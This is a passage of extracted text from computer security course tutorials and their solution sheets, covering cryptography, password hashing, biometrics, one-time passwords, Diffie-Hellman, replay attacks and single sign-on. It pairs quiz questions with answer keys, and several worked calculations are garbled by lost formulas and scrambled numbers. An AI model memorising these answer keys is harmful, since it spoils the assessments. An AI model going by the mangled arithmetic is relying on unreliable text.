the CA’s verification of the key’s ownership.
6. Hash Functions vs. Encryption Functions
Hash Functions:
One-way transformations, fixed-length output, used
for integrity checks.
No secret key necessarily; no direct “decryption”
process.
Encryption Functions:
Transform plaintext to ciphertext with a key;
reversible by the corresponding decryption
function.
Why not use a block cipher as a hash:
Block ciphers are designed for two-way
encryption/decryption.
Hashes require an irreversible property. Simply
encrypting with a block cipher does not guarantee
collision resistance or the one-way property at
scale.
6
–
–
–
–
–
–
–
–
–
–
–
–
7. Digital Signatures and Non-Repudiation
Non-Repudiation: The signer cannot deny having signed a
message because only they hold the private key used in
generating the signature.
E-Commerce Example: When a customer signs an electronic
contract or purchase agreement, the signature ensures
they cannot later claim they didn’t authorize the
transaction.
8. Block Cipher Modes
Weakness of ECB: Identical plaintext blocks produce
identical ciphertext blocks → patterns leak.
CBC Mode: Each block is XORed with the previous
ciphertext block before encryption, hiding repeated
plaintext patterns.
CTR Mode Use-Case**: High-speed streaming or parallel
encryption. Each block is encrypted by XORing the
plaintext with a keystream block generated from a
counter. Often used where random access to encrypted
data is needed.
9. Hybrid Encryption Scenario
Why Hybrid?
Public-key algorithms are computationally intensive
for large data (e.g., 1GB).
Symmetric algorithms are fast; so you generate a
random symmetric key to encrypt the bulk data, then
use the recipient’s public key only for encrypting
the small symmetric key.
Steps:
1. Generate a random symmetric key .
2. Encrypt the 1GB file with  using a fast symmetric
cipher (e.g., AES).
3. Encrypt  with the recipient’s public key.
4. Store/transmit both (encrypted data + encrypted
symmetric key).
10. MAC vs. Digital Signature
When MAC is more suitable:
In a closed system where all participants share a
secret key, and the goal is message authentication
+ integrity (e.g., within a single company’s
internal API).
MACs are typically faster and simpler to implement
k
k
k
7
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
than a signature scheme.
When a Digital Signature is better:
In open systems where you need non-repudiation and
publicly verifiable proof of authenticity (e.g., a
signed contract, public software release).
A signature does not require sharing a secret key
with the verifier.
Part C
1. Brute-Force Feasibility
Key space: .
This is  possible keys
(approximately ).
Attacker speed:  keys/sec.
Worst-case time =  seconds =
1100 seconds.
 days .
Feasibility: With modern hardware, cracking a 40-bit
key might be feasible in under an hour. This is why 40-
bit ciphers are no longer considered secure.
2. Key Length Impact
128-bit vs. 256-bit keys:
Key space(128-bit): 
Key space(256-bit): 
The ratio: .
This is an increase of  times, which is
astronomically larger.
More than just double: Doubling key length squares
the size of the key space when going from 128 to
256 bits.
3. Simple Caesar Cipher Computation
Ciphertext: “FODCGR”
Assume ‘A’ = 0, ‘B’ = 1, ..., ‘Z’ = 25.
Caesar shift by 3 (encryption shifts forward by 3). To
decrypt, shift backward by 3.
Steps (letter by letter):
240
1,099,511,627,776
1.1×1012
109
≈109240
=1091.1×1012
1.1×103
In days≈ ≈86400
11000.0127  0.3hours
2128
2256
=2128
2256
2128
2128
8
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
F → F’s position is 5 (A=0, B=1, C=2, D=3, E=4, F=5).
5 - 3 = 2 → C.
O → O’s position is 14.
14 - 3 = 11 → L.
D → D’s position is 3.
3 - 3 = 0 → A.
C → C’s position is 2.
2 - 3 = -1 → wrap around: -1 + 26 = 25 → Z.
G → G’s position is 6.
6 - 3 = 3 → D.
R → R’s position is 17.
17 - 3 = 14 → O.
Plaintext = “CLAZDO” (assuming standard Caesar with
shift of 3).
Number of possible shifts: For the English alphabet, 26
possible shifts (0 to 25).
4. Block Cipher Encryption Rate
Block size: 128 bits
Throughput: 1 million  blocks per second
In bits/sec:  bits/sec = 128
Mbps.
In megabytes/sec: .
Time for a 10 GB file:
10 GB = .
At 16 MB/s →  seconds .
5. Hash Collisions - n-bit hash: collisions around .
- For a 128-bit hash → ~ .
That’s .
Why sooner if poorly designed?
Structural weaknesses or patterns can reduce actual
complexity needed to find collisions below .
6. Public-Key Encryption Overhead
Message count: 10,000 messages, each 1KB.
RSA encryption: 5ms per message → total time =
.
Why prefer hybrid?
Public-key operations (RSA) are much slower than
symmetric. For large volumes of data or numerous
messages, using a hybrid scheme drastically reduces
total encryption time.
106
10×6128=1.28×108
=8
128 Mbps16 MB/s
10×1024≈10,240 MB
≈ =16
10,240640  10.7minutes
=2n 2n/2
=2128264
1.84×1019
264
10,000×0.005 s=50 s
9
–Also reduces computational overhead on the
sender/receiver.
```

## Tutorial 2.pdf

[Tutorial 2.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 2.pdf)

```text
1
Tutorial 2
Foundations of Cryptography
Computer Security
BCS2420
Part A
1. Which of the following best describes the advantage of
public-key (asymmetric) encryption compared to symmetric
encryption?
Faster encryption for large data
The same key is used by both sender and receiver
It simplifies secure key distribution
It eliminates the need for any private key
2. Which cryptographic property ensures that a given hash
output does not reveal any information about the original
message?
Collision resistance
One-way property
Key encapsulation
Second-preimage resistance
3. In a chosen-ciphertext attack model, the adversary can...
Only observe ciphertexts without modifying them
Submit ciphertexts to a decryption oracle and observe
the results
Pick plaintext and obtain its encryption from an
oracle
Obtain a set of plaintext-ciphertext pairs without
influencing them
4. Which statement about the Vernam cipher is correct?
It encrypts data in 64-bit blocks.
It provides perfect secrecy if the key is reused
carefully.
2
It uses modular exponentiation with prime numbers.
It can provide perfect secrecy only if the key is
truly random and used exactly once.
5. In a hybrid encryption scheme, typically...
Only the public key is needed to encrypt large
messages directly.
Symmetric keys are never involved.
A symmetric key is randomly generated for data
encryption, then encrypted with a public key.
The private key is used for both encryption and
decryption.
6. Which of the following is an active adversary action?
Eavesdropping on network traffic without modifying it
Recording ciphertext for later analysis
Injecting malicious packets into a conversation
Archiving all messages for offline cryptanalysis
7. Collision resistance in a hash function means...
Finding two distinct inputs with the same hash is
computationally infeasible.
Reconstructing the original message from the hash is
infeasible.
Finding any input that produces a given hash is easy.
Only one hash value is possible for a given input.
8. Which block cipher mode directly concatenates each
plaintext block with the preceding ciphertext block (via
XOR) before encryption?
ECB
CBC
CTR
OFB
9. Digital signatures aim to provide which of the following?
Confidentiality and authentication only
Non-repudiation, integrity, and origin authentication
Key management and collision resistance
Simple encryption of large files
10. A 56-bit key space (as in original DES) implies how many
possible keys?
256
562
1056
2×1016
3
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Part B
1. Comparing Passive vs. Active Adversaries:
Briefly define passive and active adversaries in
cryptography.
Provide one real-world example scenario of each.
Why might defending against active adversaries be more
challenging?
2. Attack Models:
Summarize the four attack models discussed (ciphertext-
only, known-plaintext, chosen-plaintext, chosen-
ciphertext).
Which model imposes the strongest requirement on a
cryptosystem’s security, and why?
3. Key Space and Security:
Explain the concept of key space.
Discuss how an increase in key length affects the
feasibility of brute-force attacks.
Give two practical factors (beyond key length) that
also determine a cipher’s real-world resistance to
brute-force.
4. Designing a Secure Symmetric Cipher:
Suppose you aim to design a new symmetric encryption
system. What core properties must it have to resist
modern cryptanalytic attacks?
Mention any two advanced cryptanalytic methods and how
a well-designed cipher can mitigate them.
5. Public-Key Infrastructure (PKI):
What is a certificate and how does it relate to trust
in PKI?
Illustrate how an organization could use PKI to ensure
secure email communication among its employees.
6. Hash Functions vs. Encryption Functions:
Compare the roles of a cryptographic hash function and
a symmetric encryption function.
Why is it generally inappropriate to use a block cipher
in place of a hash function?
7. Digital Signatures and Non-Repudiation:
What does “non-repudiation” mean in the context of
4
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
digital signatures?
Give an example in an e-commerce transaction where non-
repudiation is crucial.
8. Block Cipher Modes:
Discuss the main weakness of ECB mode.
Why is CBC mode generally preferred over ECB for
encrypting multiple blocks?
Provide a high-level use-case for CTR (counter) mode.
9. Hybrid Encryption Scenario:
You want to encrypt a 1GB file for secure storage. Why
might you opt to use a hybrid encryption approach
instead of directly using a public-key cipher for the
entire file?
Summarize the key steps in hybrid encryption for this
scenario.
10. MAC vs. Digital Signature:
In which scenarios is a Message Authentication Code
(MAC) more suitable than a digital signature?
Conversely, give an example scenario where a digital
signature is more beneficial.
Part C
1. Brute-Force Feasibility
A cryptographic system has a key space of .
How many keys are there in total?
If an attacker can try  (1 billion) keys per second,
how many seconds to exhaust the key space in the worst
case? Convert this to days (approx.).
Comment on whether this is feasible with today’s
technology.
2. Key Length Impact
You are deciding between a 128-bit key and a 256-bit
key.
By how many orders of magnitude does a 256-bit key
space exceed a 128-bit key space?
Does doubling the key length from 128 bits to 256 bits
double the security, or provide more? Briefly explain.
240
109
5
–
–
–
–
–
–
–
–
–
–
–
–
–
3. Simple Caesar Cipher Computation
The Caesar cipher shifts letters by 3. Given the
ciphertext “FODCGR” (assuming A=0, B=1, ... Z=25),
decrypt it back to plaintext.
Show your steps.
How many possible shifts (keys) are there in total if
we only consider the English alphabet?
4. Block Cipher Encryption Rate
A block cipher encrypts 128-bit blocks. The
implementation can process 1 million blocks per second.
How many bits per second does this correspond to?
How many megabytes per second is this (assuming 1 byte
= 8 bits)?
How long would it take to encrypt a 10 GB file?
5. Hash Collisions
A cryptographic hash has an n-bit output. By the
birthday paradox, collisions typically appear after
about  operations.
For a 128-bit hash, how many operations (roughly) might
be needed to find a collision?
Why might attackers find collisions sooner if the hash
function is poorly designed?
6. Public-Key Encryption Overhead
An organization wants to transmit 10,000 messages, each
1KB in size, using pure public-key encryption with RSA
(no hybrid approach). Each RSA encryption takes 5ms.
How long (in seconds) will it take to encrypt all
messages?
Why might the organization prefer hybrid encryption in
this scenario?
2n
```

## Tutorial 3 Solution.pdf

[Tutorial 3 Solution.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 3 Solution.pdf)

```text
1
Tutorial 3 Solution
Computer Security
BCS2420
Part A
1. Correct Answer: C. In offline attacks, the attacker can
test millions of guesses per second without server
interaction.
Explanation: Offline attacks do not require queries to the
legitimate server. Attackers have the hashed password data
and test guesses locally.
2. Correct Answer: B. Including salts in password hashing
Explanation: Salts ensure that each password hash is unique
even if two users share the same password or if standard
dictionary/rainbow tables exist.
3. Correct Answer: C. Slow down offline brute-force attacks
Explanation: Iterating a hash many times increases the
computational work needed to verify each guess, slowing
offline attempts significantly.
4. Correct Answer: B. Highly distinctive biometric features
among the population
Explanation: If features are very distinctive, the system
is less likely to mix up users. High distinctiveness
usually reduces FAR, not increases it. The question asks
which is not a contributor to increased FAR, so (B) is
correct.
5. Correct Answer: B. Verify the entire chain by recomputing
backward from the last OTP
Explanation: (\displaystyle h_0) is the final anchor; the
server can verify each new OTP by stepping backward (or
storing the next expected hash) in the Lamport chain.
6. Correct Answer: B. Users may get locked out or face
increased login delays
2
–
–
–
–
–
–
Explanation: Rate-limiting extends or imposes delays after
each failed attempt, which can inconvenience legitimate
users if they forget or mistype passwords.
7. Correct Answer: C. Provide unique passwords for different
sites without storing them all
Explanation: Derived-password systems combine a master
secret with site-specific data to generate multiple
distinct passwords.
8. Correct Answer: A. The overall user acceptance, because
legitimate users may be unable to register
Explanation: Failure to Enroll (FTE) means some users can’t
even create a valid biometric template, reducing
acceptance.
9. Correct Answer: C. It is kept hidden (not stored openly in
the database), forcing attackers to guess it if the
database is compromised
Explanation: A “pepper” is a secret salt. If not stored in
plaintext with the hashes, attackers can’t
straightforwardly replicate the hash checks.
10. Correct Answer: A. A hardware token relying on an implicit
time-based challenge
Explanation: The code changes every minute, implying a
time-synchronized approach.
Part B
1. Offline vs. Online Attacks
Technical Difference:
Online: The attacker must submit guesses to the
legitimate authentication server, receiving
immediate feedback on correctness.
Offline: The attacker has stolen or gained access
to the hashed password file, so guesses can be
tested locally without server involvement.
Defense Strategies:
Online: Rate-limiting, lockouts, progressive delays
after failed attempts.
Offline: Strong hashing (e.g., bcrypt, Argon2) with
3
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
salts, enforced password complexity, and minimal
distribution of password hash files.
2. Biometric System Thresholds
Threshold Impact:
A tighter threshold lowers FAR (makes it harder for
impostors) but raises FRR (legitimate users get
rejected more).
A looser threshold lowers FRR but raises FAR (more
impostors may be accepted).
Security vs. Usability:
High threshold = safer from impersonation but more
frustrated legitimate users.
Low threshold = fewer user complaints but higher
risk of unauthorized access.
3. Salting vs. Peppering
Salting:
Public, unique random value stored with each
password hash.
Defeats rainbow-table attacks by forcing each
password to have a unique hash.
Peppering:
A secret salt not stored openly.
Attackers, even with the hash file, can’t easily
validate guesses unless they also have the pepper.
Scenario:
If a database is stolen but the pepper is stored
separately (e.g., on a secure hardware module),
attackers must guess or locate that additional
secret. This significantly slows down offline
cracking.
4. Lamport Hash Chain
How It Works:
1. Begin with a secret seed .
2. Generate a chain of hashed values by repeatedly
applying a one-way function .
3. The server stores  (final link in the chain). The
user holds intermediate values.
4. Each login uses the next preimage in reverse order.
Advantage over SMS OTP:
SMS-based OTP can be intercepted or compromised via
SIM swaps.
w
H
h0
4
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Lamport chains rely on cryptographic one-way
properties, do not need telecom infrastructure, and
are fully under the user’s control.
5. Password Composition Rules
Arguments For:
Force users to avoid overly simple passwords (e.g.,
“12345”).
Provide minimal complexity floors.
Arguments Against:
Users resort to predictable patterns (like
“P@ssw0rd!”).
Usability suffers, leading to more password resets
or reuse across sites.
Alternative:
Encourage passphrases (longer, easier to remember).
Use deny lists of common passwords.
Provide real-time feedback on password strength
rather than fixed composition rules.
6. Account Recovery
Recovery Emails:
System sends a reset link or temporary code to an
email address on file.
Security depends on the email account itself being
secure.
Secret Questions:
User answers pre-chosen questions to prove
identity.
Often guessable or available via public info (e.g.,
social media).
More Secure Approach: Recovery emails are typically
stronger, assuming the email account has robust
security like MFA.
7. Rate-Limiting and Lockout Policies
Advantage of Strict Lockout:
Greatly reduces successful online brute forcing.
Drawback:
Legitimate users get locked out due to typos or
minor mistakes.
Potential for DoS attacks if attackers deliberately
trigger lockouts.
Balanced Policy:
5
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Temporary lockouts or progressive delays, combined
with robust user identity checks if repeated fails
occur.
8. Graphical Password Schemes
Two Types:
1. Click-based (cued recall): The user clicks points
on an image in a correct sequence.
Advantage: More memory-friendly (spatial cues).
Drawback: Shoulder-surfing if someone observes
the clicks.
2. Android-style pattern locks (pure recall): The user
traces a pattern on a grid.
Advantage: Faster for many users than typing.
Drawback: Smudge attacks on phone screens or
easily guessable patterns.
9. Multi-Factor Authentication (MFA)
Definition: Authentication using two or more from
“Something you know” (password), “Something you have”
(token), “Something you are” (biometric).
Security Improvement: An attacker must compromise all
factors, not just guess a password.
Potential Bypass: Social engineering or phishing can
still trick users into providing both password and
token code if the system’s implementation does not
confirm origin authenticity.
10. Biometrics as Non-Secrets
Why Non-Secret:
Fingerprints, faces, iris patterns can be captured
or photographed. People leave fingerprints on
surfaces, faces can be filmed in public.
Realistic Attack:
High-resolution photo used to create a fake face or
fingerprint mold.
Mitigation:
Liveness detection (e.g., checking blood flow,
micro-movements, challenge responses).
Combining biometrics with another authentication
factor (2FA).
6
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Part C
1. Password Space Calculation
(a) Total possibilities: 
62 characters (A–Z, a–z, 0–9) raised to the 12th power.
(b) Worst-case offline cracking time:
Let  be the total passwords.
Attacker speed:  guesses/s.
Time in seconds: .
Convert to days: 
For a rough estimate:
  
1. Time to Crack with Iterated Hashing
Hash function: 1 microsecond per hash.
(a) With 10,000 iterations: 
(b) For  password attempts: 
2. Biometric Error Rates
(a) FRR of (2%): Out of 10,000 legitimate attempts,
(2%) fail →  rejects.
(b) FAR of (0.1%): Out of 10,000 impostor attempts,
(0.1%) succeed →  false accepts.
3. One-Time Password Rate
Time-based OTP changes every 30s:
The intercepted code becomes invalid after its 30s
window. Replaying it at 45s will fail.
Reduction of Replay Attacks:
Attackers have only a short window to reuse the
same OTP.
Potential vulnerability: If the clock is out of
sync or there’s a short grace period, an attacker
might slip in a brief replay. Typically, systems
mitigate this by limiting each code to exactly one
use.
Space=6212
N=6212
108
108N
Days= .(10×86400)8N
62≈123.2×1021 ⟹ =1083.2×1021
3.2×10 seconds≈13 3.2×
10/(8.64×13 10)≈4 3.7×10 days≈8 10 years.6
Time per check=10,000×
1μs=10,000μs=0.01 s (10 ms).
109 10×90.01 s=10 s≈7
115.74 days
10,000×0.02=200
10,000×0.001=10
```

## Tutorial 3.pdf

[Tutorial 3.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 3.pdf)

```text
1
Tutorial 3
Computer Security
BCS2420
Part A
1. Which of the following statements best reflects the
difference between online and ofﬂine password guessing
attacks?
In offline attacks, the attacker must query the
legitimate server.
In online attacks, the attacker independently tests
password guesses without interacting with a server.
In offline attacks, the attacker can test millions of
password guesses per second without server
interaction.
Online attacks generally allow for more guesses than
offline attacks.
2. Which approach best prevents a pre-computed dictionary
(rainbow table) attack on a password hash?
Storing passwords in cleartext files
Including salts in password hashing
Using plaintext-based challenge-response methods
Employing rate-limiting on user login attempts
3. A password-based user authentication system enforces
password stretching by applying a hash 100,000 times to
each password during verification. This primarily helps to:
Increase user convenience by speeding up verification
Prevent user lockouts
Slow down offline brute-force attacks
Make online brute-force attacks less frequent
4. Which factor is not a major contributor to an increased
False Accept Rate (FAR) in a biometric system?
Loosening the matching threshold
2
Highly distinctive biometric features among the
population
Poor sensor quality causing noisy data
Minimal differences between some users’ biometric
traits
5. In a system using Lamport hash chains for one-time
passwords, the main purpose of storing  on the server is
to:
Store the user’s salt for password hashing
Verify the entire chain by recomputing backward from
the last OTP
Act as the user’s private key for signcryption
Reduce the offline attack surface on the user’s
master password
6. When using rate-limiting to defend against online password
guessing attacks, which of the following is a common
negative side effect?
Users experience frequent password resets
Users may get locked out or face increased login
delays
Offline attackers can still freely attempt password
guesses
The salted hashes become easier to crack
7. A system that derives each application password from a
master password (plus the domain name) attempts to:
Reduce the password space by reusing the same
password everywhere
Eliminate the need for salts and peppers
Provide unique passwords for different sites without
storing them all
Make offline dictionary attacks simpler to perform
8. In biometric authentication, Failure to Enroll (FTE) most
directly impacts:
The overall user acceptance, because legitimate users
may be unable to register their biometric
The run-time performance of matching algorithms
The false accept rate (FAR)
Ensuring offline password cracking is infeasible
9. A 'secret salt' (pepper) is different from a normal salt
because:
It is encrypted and stored alongside the user’s
h0
3
–
–
–
–
–
–
–
–
–
password
It is unknown to both the server and the user
It is kept hidden (not stored openly in the
database), forcing attackers to guess it if the
database is compromised
It replaces hashing entirely
10. Using a passcode generator that refreshes codes every
minute is an example of:
A hardware token relying on an implicit time-based
challenge
An explicit challenge-response protocol requiring a
PIN entry
An offline password-based approach
A derived password approach matching domain names
Part B
1. Offline vs. Online Attacks
Explain the difference between online and ofﬂine
password guessing attacks in technical terms.
Give two defense strategies specific to each type of
attack.
2. Biometric System Thresholds
Discuss how a biometric threshold affects the False
Accept Rate (FAR) and False Reject Rate (FRR).
Why can adjusting the threshold cause a security vs.
usability trade-off?
3. Salting vs. Peppering
Compare salting and peppering in password storage.
Provide one example scenario illustrating the benefit
of using pepper.
4. Lamport Hash Chain
Describe how a Lamport hash chain generates one-time
passwords.
Why might an organization prefer Lamport chains over
simply sending a user an SMS OTP?
5. Password Composition Rules
Summarize the main arguments for and against strict
4
–
–
–
–
–
–
–
–
–
–
–
–
–
–
password composition rules (e.g., mandatory uppercase,
symbols, length).
Suggest an alternative policy that encourages stronger
password choices without imposing composition rules.
6. Account Recovery
Compare two popular methods of account recovery (e.g.,
recovery emails vs. secret questions).
In your view, which method is more secure and why?
7. Rate-Limiting and Lockout Policies
Present one advantage and one drawback of strict
account lockout after a limited number of failed login
attempts.
Suggest a policy that balances security and usability.
8. Graphical Password Schemes
Outline two distinct types of graphical password
schemes and their security advantages.
Mention one drawback for each type.
9. Multi-Factor Authentication (MFA)
Define multi-factor authentication and explain why
combining multiple factors (e.g., password + token) can
improve security.
Provide an example of how an attacker might still
bypass MFA if it’s poorly implemented.
10. Biometrics as Non-Secrets
Why do security experts say biometrics are non-secrets?
Give an example of a realistic attack that exploits
this property and how a system might mitigate it.
Part C
1. Password Space Calculation
A system randomly assigns a 12-character password where
each character is chosen from 62 possible symbols (A–Z,
a–z, 0–9).
(a) Calculate the total number of possible passwords.
(b) If an attacker can attempt  guesses per second
in an offline attack, how many days might it take, in
the worst case, to try all possibilities?
108
5
–
–
–
–
–
–
–
–
–
2. Time to Crack with Iterated Hashing
Suppose we have a hash function ( H ) that can be
computed in 1 microsecond.
If the system iterates this hash 10,000 times for each
password check, how much time does one password
verification take?
If an attacker tries to brute-force  passwords
offline and must perform these same iterations, how
many seconds will the attacker spend in total?
3. Biometric Error Rates
A facial recognition system has a False Accept Rate
(FAR) of (0.1%) and a False Reject Rate (FRR) of (2%).
(a) If 10,000 logins are attempted by legitimate users,
about how many failures would you expect due to FRR?
(b) If 10,000 login attempts are made by impostors,
about how many successes (incorrect acceptances) do you
expect, on average?
4. One-Time Password Rate
A one-time password system (using time-based tokens)
updates the code every 30 seconds.
If an attacker intercepts the code and tries to replay
it after 45 seconds, will it succeed?
Discuss how this mechanism reduces replay attacks and
any potential timing vulnerabilities.
109
```

## Tutorial 4 Solution.pdf

[Tutorial 4 Solution.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 4 Solution.pdf)

```text
1
Tutorial 4 Solution
Computer Security
BCS2420
Part A
1. Answer: B. In key transport, one party picks the key and
securely sends it; in key agreement, both parties’ inputs
determine the shared key.
2. Answer: D. Symmetric key (it’s not a typical TVP, but a
long-term or session key, not a fresh parameter like a
nonce/timestamp).
3. Answer: A. The parties do not verify each other’s public
parameters.
4. Answer: B. It involves sending a copy of a message back to
the original sender.
5. Answer: B. Actively forwarding protocol messages in real
time between two unsuspecting parties.
6. Answer: B. Offline attackers can replay (H(K)) without
knowing (K).
7. Answer: A. Explicit key authentication ensures key
confirmation, while implicit only assures the key is shared
by correct parties.
8. Answer: B. It ensures that compromising a long-term key
does not reveal past session keys.
9. Answer: C. Keeping track of large prime factorization
results is not typically a key-management concern.
10. Answer: B. Using nonce-based challenges or timestamps.
2
–
–
–
–
–
–
–
–
–
Part B
1. Replays and Nonces
A nonce is a random, one-time-use value included in a
challenge to the other party. If the protocol ensures
the responder’s reply includes this nonce in a
cryptographically secure manner (e.g., signed or hashed
with a secret), an attacker cannot replay old messages
successfully.
If the recipient does not verify that the nonce was
recently generated, the attacker might replay an old
nonce-response pair that once worked, tricking the
protocol into accepting it.
2. Authenticated vs. Unauthenticated DH
Unauthenticated DH means an attacker can insert
themselves (man-in-the-middle) and negotiate separate
keys with each party. The parties do not confirm each
other’s identity or public parameters.
Authenticated DH (using public-key signatures or shared
secrets) ensures each ephemeral message is bound to a
known identity. This prevents MITM by letting each side
confirm the other’s ephemeral exponent belongs to the
correct entity.
3. Forward Secrecy Concepts
Forward secrecy means that if long-term keys are
compromised in the future, past session keys remain
protected. This is crucial in TLS to ensure that
recorded traffic cannot be decrypted retroactively.
Without forward secrecy, an attacker who obtains the
server’s private key can decrypt all previously
captured TLS sessions. That can expose old passwords,
credit card data, etc.
4. Reflection vs. Relay
Reflection: The attacker replays a challenge from the
server back to the server itself (or from the client
back to the client) by interleaving parallel runs.
Relay: The attacker simply passes messages in real time
between two legitimate parties who think they are
talking to each other, but in fact the attacker stands
in the middle.
Example: Relay might fool a car’s proximity sensor by
3
–
–
–
–
–
–
–
–
–
–
capturing signals from the key fob in the house and
relaying them to the car outside.
5. Dictionary Attack Defenses
Technical:
1. Use protocols that do not reveal direct hashes or
short challenge responses.
2. Implement rate-limiting or lockout after a few
failed attempts.
6. Policy: 1. Require stronger (longer) passwords, possibly
passphrases. 2. Encourage multi-factor auth so even if the
password is guessed, an additional factor is needed.
7. DH-EKE (Sketch)
Basic flow:
1. A→B: A’s ephemeral  encrypted under the password.
2. B→A: B’s ephemeral  encrypted under the password.
3. Both derive a key from .
Encrypting the ephemeral shares with the password hides
them from offline attackers. Attackers can’t reliably
test guesses if they can’t confirm which ephemeral
exponent is correct.
8. Single Sign-On Threats
Risk 1: If the SSO provider is compromised, all
connected services are compromised.
Risk 2: Token replay or forging SSO tokens (in OIDC or
SAML), letting an attacker impersonate a user across
multiple apps.
Mitigations:
Harden the SSO IdP with strong security and monitoring.
Sign and validate tokens with short lifetimes;
implement audience checks and signature verification at
each service.
Part C
1. Number of Offline Guesses
 possible passwords, attacker tests 
guesses/second.
Time =  seconds =  hours.
ga
gb
gab
1011 107
=1071011
104 10/3600≈4 2.78
4
–
–
–
–
–
2. Diffie-Hellman Security
The discrete log problem for a 2048-bit prime is
considered beyond  operations in practice. Sub-
exponential algorithms (e.g., number field sieve) still
require huge resources. So performing  direct tries
is not nearly enough to break 2048-bit DH. The
complexity is significantly higher than a naive
approach might suggest.
3. Replay with Timestamps
A message is valid within 2 minutes of its timestamp.
The attacker can replay it successfully only within
that 2-minute window. After that, the receiver rejects
it as stale.
4. Diffie-Hellman EKE Overhead
2 exchanges, each side does encryption & decryption = 4
total operations if we count each direction separately
(A encrypt, B decrypt, B encrypt, A decrypt).
If each operation is 1ms, that’s 4ms total. Or if we
interpret “2 exchanges” as (A→B + B→A), that’s 2
encryption + 2 decryption = 4ms overhead total.
5. SSO: Single Sign-On Attempt Time
5 SSO checks × 50ms each = 250ms total wait. (Unless
the system caches the first SSO token, but we ignore
that.)
260
260
```

## Tutorial 4.pdf

[Tutorial 4.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 4.pdf)

```text
1
Tutorial 4
Computer Security
BCS2420
Part A
1. Which statement best describes the difference between key
transport and key agreement?
In key transport, the shared key is a result of both
parties’ private contributions, while in key
agreement one party unilaterally chooses the session
key.
In key transport, one party picks the key and
securely sends it; in key agreement, both parties’
inputs determine the shared key.
Key transport always ensures forward secrecy, while
key agreement never does.
Key transport is used only for symmetric algorithms;
key agreement is used only for asymmetric algorithms.
2. Which of the following is not a time-variant parameter
(TVP) typically used to prevent replay attacks?
Nonce
Timestamp
Sequence number
Symmetric key
3. In a Diffie-Hellman key exchange, if an active attacker
performs a middle-person (man-in-the-middle) attack, what
is the primary vulnerability being exploited?
The parties do not verify each other’s public
parameters.
The prime modulus (p) is too large for practical
usage.
The discrete log problem is easy to solve.
Both endpoints are using ephemeral keys with perfect
2
forward secrecy.
4. Which statement about a reﬂection attack is accurate?
It is an attack where the adversary tries many
dictionary passwords offline.
It involves sending a copy of a message back to the
original sender to confuse or bypass authentication
steps.
It uses advanced polynomial-time algorithms to invert
a one-way function.
It always requires physical proximity to the victim’s
device.
5. Which scenario best illustrates a relay attack?
Reusing an old message to trick the server into
accepting stale credentials
Actively forwarding protocol messages in real time
between two unsuspecting parties to impersonate one
side
Using reflection to replay the server’s random
challenge back to it
Flooding the network with random guesses of session
keys
6. In an entity-authentication protocol, why might using a
simple hash of the secret key (e.g., ) to prove
knowledge be insecure?
Hash functions are always collision-resistant, so
replays cannot occur.
Offline attackers can replay  without knowing
.
The hash output is too large to fit in typical
protocol messages.
The server must reveal its own secret for the
handshake to complete.
7. Which property distinguishes implicit key authentication
from explicit key authentication?
Explicit key authentication ensures the key is not
only known to the correct parties but also confirmed
by them, while implicit authentication only assures
the key is shared by correct parties.
Implicit key authentication uses ephemeral keys,
explicit uses static keys.
Implicit key authentication always provides forward
H(K)
H(K)
K
3
–
–
secrecy, explicit never does.
They are identical properties; the terms are
interchangeable.
8. Why is forward secrecy often desired in key-establishment
protocols?
It allows for usage of older, weaker ciphers without
risk.
It ensures that compromising a long-term key does not
reveal past session keys.
It eliminates the need for ephemeral keys entirely.
It requires fewer computational resources on each
side.
9. Which of the following is not a fundamental challenge in
key management for secure protocols?
Securely generating random keys
Preventing key reuse across multiple sessions
Keeping track of large prime factorization results
for future reference
Distributing or establishing keys without leaking
them to adversaries
10. A replay attack on a password-based protocol can be
mitigated by:
Storing the password in plaintext on the server
Using nonce-based challenges or timestamps to ensure
each response is fresh
Disabling hashing in favor of direct key usage
Relying on IP address binding for user authentication
Part B
1. Replays and Nonces
Question: Explain how a nonce can protect a protocol
from replay attacks. Include a scenario where a replay
could succeed if the nonce is not verified properly.
2. Authenticated Key Establishment
Question: Compare a purely unauthenticated Diffie-
Hellman exchange with an authenticated one (e.g., using
digital signatures or shared secret-based proofs). What
4
–
–
–
–
–
–
–
security risks does unauthenticated DH pose, and how
does authentication mitigate them?
3. Forward Secrecy Concepts
Question: Define forward secrecy in your own words. Why
is it desirable in protocols like TLS? Give an example
of how failing to provide forward secrecy could harm a
user after a key compromise.
4. Reflection vs. Relay
Question: Differentiate reflection attacks from relay
attacks in authentication protocols. Provide an example
of a scenario or protocol each might exploit.
5. Dictionary Attack Defenses
Question: In what ways can a system or protocol limit
the success of offline dictionary attacks? Suggest both
technical and policy solutions.
6. DH-EKE
Question: Sketch a simplified Diffie-Hellman Encrypted
Key Exchange (DH-EKE) message flow. Explain the
significance of encrypting DH shares with the user’s
password.
7. Single Sign-On Threats
Question: Single Sign-On (SSO) can increase convenience
but also enlarge the attack surface if not designed
carefully. Explain two significant security risks in an
SSO system and how they can be mitigated.
Part C
1. Number of Offline Guesses
Question: Suppose an attacker has intercepted a
transcript from a password-based challenge-response
protocol. They can test  password guesses per second
offline. How many hours until they exhaust a dictionary
of  possible passwords?
2. Diffie-Hellman Security
Question: A standard Diffie-Hellman exchange uses a
2048-bit prime (p). If an attacker attempts to break it
via discrete log, they can perform  operations in a
107
1011
260
5
–
–
–
feasible timeframe. Why is this still not enough for
practical success, considering typical estimates for
discrete log complexity (e.g., sub-exponential LMM or
NFS algorithms)? (Provide a short conceptual
explanation rather than exact numeric estimates.)
3. Replay with Timestamps
Question: A protocol uses timestamps with a 2-minute
validity window to prevent replay. If an attacker
obtains a valid message at time (t=0), how long can
they replay it successfully (assuming no other checks)?
4. Diffie-Hellman EKE Overhead
